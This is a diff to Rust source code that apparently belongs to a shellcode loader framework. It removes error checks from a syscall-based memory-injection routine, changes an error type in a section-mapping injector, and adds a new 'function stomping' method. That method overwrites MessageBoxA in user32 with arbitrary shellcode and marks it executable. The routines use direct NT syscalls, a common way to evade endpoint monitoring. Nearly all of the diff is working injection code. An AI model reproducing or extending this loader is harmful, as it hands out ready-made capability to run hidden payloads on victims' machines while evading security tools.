@@ -17,26 +17,17 @@ pub fn inject_default_local(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
         
         // Allocate memory with RW permissions
         return_value = syscall!("NtAllocateVirtualMemory", -1isize, &mut base_address, 0, &mut region_size, allocation_type, 0x04);
-        if return_value != 0 {
-            return Err(return_value);
-        }
         
         // Write shellcode to allocated memory
         let shellcode_ptr = bytes_to_load.as_ptr() as *const c_void;
         let mut bytes_written: usize = 0;
         return_value = syscall!("NtWriteVirtualMemory", -1isize, base_address, shellcode_ptr, bytes_to_load.len(), &mut bytes_written);
-        if return_value != 0 {
-            return Err(return_value);
-        }
         
         // Change memory protection to RX
         let mut protectaddress_to_protect: *mut c_void = base_address;
         let mut size_to_protect = bytes_to_load.len();
         let mut oldprotect: u32 = 0;
         return_value = syscall!("NtProtectVirtualMemory", -1isize, &mut protectaddress_to_protect, &mut size_to_protect, 0x20, &mut oldprotect);
-        if return_value != 0 {
-            return Err(return_value);
-        }
         
         Ok(base_address)
     }
@@ -53,7 +44,7 @@ use std::ptr::copy_nonoverlapping;
 use rust_syscalls::syscall;
 
 #[cfg(feature = "InjectionMappingLocal")]
-pub fn inject_mapping_local(shellcode: &[u8]) -> Result<*mut c_void, String> {
+pub fn inject_mapping_local(shellcode: &[u8]) -> Result<*mut c_void, i32> {
     unsafe {
         let mut section_handle: *mut c_void = std::ptr::null_mut();
         let mut max_size: u64 = shellcode.len() as u64;
@@ -100,5 +91,63 @@ pub fn inject_mapping_local(shellcode: &[u8]) -> Result<*mut c_void, String> {
         syscall!("NtClose", section_handle);
 
         Ok(base_address)
+    }
+}
+
+// =======================================================================================================
+// INJECTION METHOD: FUNCTION STOMPING
+// =======================================================================================================
+
+#[cfg(feature = "InjectionFunctionStomping")]
+use std::ptr::copy_nonoverlapping;
+
+#[cfg(feature = "InjectionFunctionStomping")]
+use windows_sys::Win32::{
+    Foundation::HMODULE,
+    System::{
+        LibraryLoader::{GetProcAddress, LoadLibraryA},
+        Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE},
+    },
+};
+
+#[cfg(feature = "InjectionFunctionStomping")]
+use windows_sys::s;
+
+#[cfg(feature = "InjectionFunctionStomping")]
+pub fn inject_function_stomping(shellcode: &[u8]) -> Result<*mut c_void, i32> {
+    unsafe {
+        // Load user32.dll
+        let h_module = LoadLibraryA(s!("user32"));
+        let func_address = GetProcAddress(h_module, s!("MessageBoxA"));
+        let func_ptr = func_address.unwrap() as *mut c_void;
+        // Change memory protection to RW
+        let mut old_protect: u32 = 0;
+        if VirtualProtect(
+            func_ptr,
+            shellcode.len(),
+            PAGE_READWRITE,
+            &mut old_protect,
+        ) == 0 {
+            return Err(-1);
+        }
+
+        // Overwrite the function with shellcode
+        copy_nonoverlapping(
+            shellcode.as_ptr(),
+            func_ptr as *mut u8,
+            shellcode.len(),
+        );
+
+        // Restore memory protection to RX
+        if VirtualProtect(
+            func_ptr,
+            shellcode.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        ) == 0 {
+            return Err(-1);
+        }
+
+        Ok(func_ptr)
     }
 }
